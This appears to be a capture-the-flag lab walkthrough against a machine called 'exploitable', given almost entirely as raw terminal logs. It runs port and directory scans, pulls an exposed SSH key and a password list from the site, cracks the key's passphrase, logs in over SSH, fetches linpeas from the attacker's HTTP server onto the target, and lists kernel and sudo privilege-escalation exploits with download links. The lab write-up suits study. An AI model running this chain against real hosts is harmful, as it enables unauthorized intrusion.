


```
└─# nmap -p- 10.10.2.216 
Starting Nmap 7.93 ( https://nmap.org ) at 2025-01-14 01:38 UTC
Nmap scan report for ip-10-10-2-216.eu-west-1.compute.internal (10.10.2.216)
Host is up (0.0058s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 02:04:59:2A:A2:55 (Unknown)
```


```
┌──(root㉿kali)-[~]
└─# nmap -p 22,80 -sVC 10.10.2.216 
Starting Nmap 7.93 ( https://nmap.org ) at 2025-01-14 01:38 UTC
Nmap scan report for ip-10-10-2-216.eu-west-1.compute.internal (10.10.2.216)
Host is up (0.00023s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 340efe0612673ea4ebab7ac4816dfea9 (RSA)
|   256 49611ef4526e7b2998db302d16edf48b (ECDSA)
|_  256 b860c45bb7b2d023a0c756595c631ec4 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: House of danak
|_http-server-header: Apache/2.4.29 (Ubuntu)
MAC Address: 02:04:59:2A:A2:55 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.65 seconds
```


```
──(root㉿kali)-[~]
└─# gobuster dir -u http://10.10.2.216 -w /usr/share/wordlists/dirb/big.txt -x txt,php,js,html,php 
===============================================================
Gobuster v3.2.0-dev
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.2.216
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.2.0-dev
[+] Extensions:              php,js,html,txt
[+] Timeout:                 10s
===============================================================
2025/01/14 01:40:32 Starting gobuster in directory enumeration mode
===============================================================
/.htaccess.html       (Status: 403) [Size: 276]
/.htaccess            (Status: 403) [Size: 276]
/.htpasswd.php        (Status: 403) [Size: 276]
/.htaccess.txt        (Status: 403) [Size: 276]
/.htpasswd            (Status: 403) [Size: 276]
/.htpasswd.js         (Status: 403) [Size: 276]
/.htaccess.js         (Status: 403) [Size: 276]
/.htaccess.php        (Status: 403) [Size: 276]
/.htpasswd.html       (Status: 403) [Size: 276]
/.htpasswd.txt        (Status: 403) [Size: 276]
/about.html           (Status: 200) [Size: 1435]
/about.php            (Status: 200) [Size: 2213]
/index.html           (Status: 200) [Size: 2762]
/robots.txt           (Status: 200) [Size: 33]
/robots.txt           (Status: 200) [Size: 33]
/secret               (Status: 301) [Size: 311] [--> http://10.10.2.216/secret/]
/server-status        (Status: 403) [Size: 276]
/uploads              (Status: 301) [Size: 312] [--> http://10.10.2.216/uploads/]
Progress: 98523 / 102350 (96.26%)===============================================================
2025/01/14 01:40:45 Finished
===============================================================
```


http://10.10.2.216/secret/secretKey
```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,82823EE792E75948EE2DE731AF1A0547

T7+F+3ilm5FcFZx24mnrugMY455vI461ziMb4NYk9YJV5uwcrx4QflP2Q2Vk8phx
H4P+PLb79nCc0SrBOPBlB0V3pjLJbf2hKbZazFLtq4FjZq66aLLIr2dRw74MzHSM
FznFI7jsxYFwPUqZtkz5sTcX1afch+IU5/Id4zTTsCO8qqs6qv5QkMXVGs77F2kS
Lafx0mJdcuu/5aR3NjNVtluKZyiXInskXiC01+Ynhkqjl4Iy7fEzn2qZnKKPVPv8
9zlECjERSysbUKYccnFknB1DwuJExD/erGRiLBYOGuMatc+EoagKkGpSZm4FtcIO
IrwxeyChI32vJs9W93PUqHMgCJGXEpY7/INMUQahDf3wnlVhBC10UWH9piIOupNN
SkjSbrIxOgWJhIcpE9BLVUE4ndAMi3t05MY1U0ko7/vvhzndeZcWhVJ3SdcIAx4g
/5D/YqcLtt/tKbLyuyggk23NzuspnbUwZWoo5fvg+jEgRud90s4dDWMEURGdB2Wt
w7uYJFhjijw8tw8WwaPHHQeYtHgrtwhmC/gLj1gxAq532QAgmXGoazXd3IeFRtGB
6+HLDl8VRDz1/4iZhafDC2gihKeWOjmLh83QqKwa4s1XIB6BKPZS/OgyM4RMnN3u
Zmv1rDPL+0yzt6A5BHENXfkNfFWRWQxvKtiGlSLmywPP5OHnv0mzb16QG0Es1FPl
xhVyHt/WKlaVZfTdrJneTn8Uu3vZ82MFf+evbdMPZMx9Xc3Ix7/hFeIxCdoMN4i6
8BoZFQBcoJaOufnLkTC0hHxN7T/t/QvcaIsWSFWdgwwnYFaJncHeEj7d1hnmsAii
b79Dfy384/lnjZMtX1NXIEghzQj5ga8TFnHe8umDNx5Cq5GpYN1BUtfWFYqtkGcn
vzLSJM07RAgqA+SPAY8lCnXe8gN+Nv/9+/+/uiefeFtOmrpDU2kRfr9JhZYx9TkL
wTqOP0XWjqufWNEIXXIpwXFctpZaEQcC40LpbBGTDiVWTQyx8AuI6YOfIt+k64fG
rtfjWPVv3yGOJmiqQOa8/pDGgtNPgnJmFFrBy2d37KzSoNpTlXmeT/drkeTaP6YW
RTz8Ieg+fmVtsgQelZQ44mhy0vE48o92Kxj3uAB6jZp8jxgACpcNBt3isg7H/dq6
oYiTtCJrL3IctTrEuBW8gE37UbSRqTuj9Foy+ynGmNPx5HQeC5aO/GoeSH0FelTk
cQKiDDxHq7mLMJZJO0oqdJfs6Jt/JO4gzdBh3Jt0gBoKnXMVY7P5u8da/4sV+kJE
99x7Dh8YXnj1As2gY+MMQHVuvCpnwRR7XLmK8Fj3TZU+WHK5P6W5fLK7u3MVt1eq
Ezf26lghbnEUn17KKu+VQ6EdIPL150HSks5V+2fC8JTQ1fl3rI9vowPPuC8aNj+Q
Qu5m65A5Urmr8Y01/Wjqn2wC7upxzt6hNBIMbcNrndZkg80feKZ8RD7wE7Exll2h
v3SBMMCT5ZrBFq54ia0ohThQ8hklPqYhdSebkQtU5HPYh+EL/vU1L9PfGv0zipst
gbLFOSPp+GmklnRpihaXaGYXsoKfXvAxGCVIhbaWLAp5AybIiXHyBWsbhbSRMK+P
-----END RSA PRIVATE KEY-----
```

http://10.10.2.216/uploads/
```
Spring2017
Spring2016
Spring2015
Spring2014
Spring2013
spring2017
spring2016
spring2015
spring2014
spring2013
Summer2017
Summer2016
Summer2015
Summer2014
Summer2013
summer2017
summer2016
summer2015
summer2014
summer2013
Autumn2017
Autumn2016
Autumn2015
Autumn2014
Autumn2013
autumn2017
autumn2016
autumn2015
autumn2014
autumn2013
Winter2017
Winter2016
Winter2015
Winter2014
Winter2013
winter2017
winter2016
winter2015
winter2014
winter2013
P@55w0rd
P@ssw0rd!
P@55w0rd!
sqlsqlsqlsql
SQLSQLSQLSQL
Welcome123
Welcome1234
Welcome1212
PassSql12
network
networking
networks
test
testtest
testing
testing123
testsql
test-sql3
sqlsqlsqlsqlsql
bankbank
default
test
testing
password2

password
Password1
Password1!
P@ssw0rd
password12
Password12
security
security1
security3
secuirty3
complex1
complex2
complex3
sqlserver
sql
sqlsql
password1
password123
complexpassword
database
server
changeme
change
sqlserver2000
sqlserver2005
Sqlserver
SqlServer
Password1
Password2
P@ssw0rd
P@ssw0rd!
P@55w0rd!
P@ssword!
Password!
password!
sqlsvr
sqlaccount
account
sasa
sa
administator
pass
sql
microsoft
sqlserver
sa
hugs
sasa
welcome
welcome1
welcome2
march2011
sqlpass
sqlpassword
guessme
bird
P@55w0rd!
test
dev
devdev
devdevdev
qa
god
admin
adminadmin
admins
goat
sysadmin
water
dirt
air
earth
company
company1
company123
company1!
company!
secret
secret!
secret123
secret1212
secret12
secret1!
sqlpass123
Summer2013
Summer2012
Summer2011
Summer2010
Summer2009
Summer2008
Winter2013
Winter2012
Winter2011
Winter2010
Winter2009
Winter2008
summer2013
summer2012
summer2011
summer2010
summer2009
summer2008
winter2013
winter2012
winter2011
winter2010
winter2009
winter2008
123456
abcd123
abc
burp
private
unknown
wicked
alpine
trust
microsoft
sql2000
sql2003
sql2005
sql2008
vista
xp
nt
98
95
2003
2008
someday
sql2010
sql2011
sql2009
complex
goat
changelater
rain
fire
snow
unchanged
qwerty
12345678
football
baseball
basketball
abc123
111111
1qaz2wsx
dragon
master
monkey
letmein
login
princess
solo
qwertyuiop
starwars

```

http://10.10.2.216/
```
<!-- john, please add some actual content to the site! lorem ipsum is horrible to look at. -->
```


```
cd .ssh 
touch id_rsa
/opt/john/ssh2jobn id_rsa > id_rsa.hash
```

```
┌──(root㉿kali)-[~/.ssh]
└─# /usr/sbin/john id_rsa.hash --wordlist=/root/Documents/dict.txt 
Created directory: /root/.john
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
letmein          (id_rsa)     
1g 0:00:00:00 DONE (2025-01-14 01:56) 33.33g/s 7400p/s 7400c/s 7400C/s baseball..starwars
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```


```
┌──(root㉿kali)-[~/.ssh]
└─# chmod 600 id_rsa 
                                                                                         
┌──(root㉿kali)-[~/.ssh]
└─# ssh -i id_rsa john@10.10.2.216  
The authenticity of host '10.10.2.216 (10.10.2.216)' can't be established.
ED25519 key fingerprint is SHA256:3Kz4ZAujxMQpTzzS0yLL9dLKLGmA1HJDOLAQWfmcabo.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.2.216' (ED25519) to the list of known hosts.
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-76-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Jan 14 01:59:09 UTC 2025

  System load:  0.0               Processes:           98
  Usage of /:   41.2% of 9.78GB   Users logged in:     0
  Memory usage: 18%               IP address for eth0: 10.10.2.216
  Swap usage:   0%


0 packages can be updated.
0 updates are security updates.


Last login: Mon Jul 27 20:17:26 2020 from 10.8.5.10
john@exploitable:~$ 

```

```
john@exploitable:~$ cat user.txt 
a5c2ff8b9c2e3d4fe9d4ff2f1a5a6e7e
```

```
┌──(root㉿kali)-[~/Downloads]
└─# wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
```

```
┌──(root㉿kali)-[~/Downloads]
└─# python3 -m http.server 8080 
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
10.10.2.216 - - [14/Jan/2025 02:01:59] "GET /linpeas.sh HTTP/1.1" 200 -
```

```
wget http://<ip_address>:8080/linpeas.sh
```

```
╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester                                                                                                                                                                
[+] [CVE-2021-4034] PwnKit                                                                                                                                                                      cd
   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: mint=19,[ ubuntu=18|20 ], debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2018-18955] subuid_shell

   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1712
   Exposure: probable
   Tags: [ ubuntu=18.04 ]{kernel:4.15.0-20-generic},fedora=28{kernel:4.16.3-301.fc28}
   Download URL: https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/45886.zip
   Comments: CONFIG_USER_NS needs to be enabled

[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)

   Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
   Exposure: less probable
   Tags: ubuntu=(22.04){kernel:5.15.0-27-generic}
   Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2022-2586] nft_object UAF

   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
   Exposure: less probable
   Tags: ubuntu=(20.04){kernel:5.12.13}
   Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: less probable
   Tags: ubuntu=20.04{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

[+] [CVE-2019-18634] sudo pwfeedback

   Details: https://dylankatz.com/Analysis-of-CVE-2019-18634/
   Exposure: less probable
   Tags: mint=19
   Download URL: https://github.com/saleemrashid/sudo-cve-2019-18634/raw/master/exploit.c
   Comments: sudo configuration requires pwfeedback to be enabled.

[+] [CVE-2019-15666] XFRM_UAF

   Details: https://duasynt.com/blog/ubuntu-centos-redhat-privesc
   Exposure: less probable
   Download URL: 
   Comments: CONFIG_USER_NS needs to be enabled; CONFIG_XFRM needs to be enabled

[+] [CVE-2017-5618] setuid screen v4.5.0 LPE

   Details: https://seclists.org/oss-sec/2017/q1/184
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/https://www.exploit-db.com/exploits/41154

[+] [CVE-2017-0358] ntfs-3g-modprobe

   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1072
   Exposure: less probable
   Tags: ubuntu=16.04{ntfs-3g:2015.3.14AR.1-1build1},debian=7.0{ntfs-3g:2012.1.15AR.5-2.1+deb7u2},debian=8.0{ntfs-3g:2014.2.15AR.2-1+deb8u2}
   Download URL: https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/41356.zip
   Comments: Distros use own versioning scheme. Manual verification needed. Linux headers must be installed. System must have at least two CPU cores.


```